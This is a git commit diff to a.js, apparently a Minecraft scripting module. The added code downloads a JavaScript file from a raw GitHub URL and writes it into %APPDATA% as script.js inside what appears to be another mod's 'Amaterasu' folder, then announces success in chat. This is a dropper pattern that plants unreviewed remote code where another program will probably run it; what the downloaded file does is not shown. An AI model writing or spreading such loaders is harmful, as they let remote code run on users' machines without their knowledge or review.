dd1dbed3b2e2e88325c56b74366d9fdfb0dc0f9e
satnnyy <satnnyy@gmail.com>
2025-06-11 16:38:30 +1000

    Update a.js

--- a.js
+++ a.js
@@ -1,6 +1,5 @@
-import { request } from 'axios'; 
-const File = Java.type('java.io.File'); 
-const FileWriter = Java.type('java.io.FileWriter'); 
+const File = Java.type('java.io.File');
+const FileWriter = Java.type('java.io.FileWriter');
 const System = Java.type('java.lang.System');
 
 // Get %APPDATA%
@@ -16,8 +15,10 @@ const file = new File(targetPath, "script.js");
 // GitHub raw file URL
 const url = "https://raw.githubusercontent.com/satnnyy/test1/refs/heads/main/b.js";
 
-request(url).then(response => {
-  const fw = new FileWriter(file);
-  fw.write(response.data);
-  fw.close();
-});
+// Download and write the file
+const content = FileLib.getUrlContent(url);
+const fw = new FileWriter(file);
+fw.write(content);
+fw.close();
+
+ChatLib.chat("§a[✓] b.js downloaded to Amaterasu/script.js");
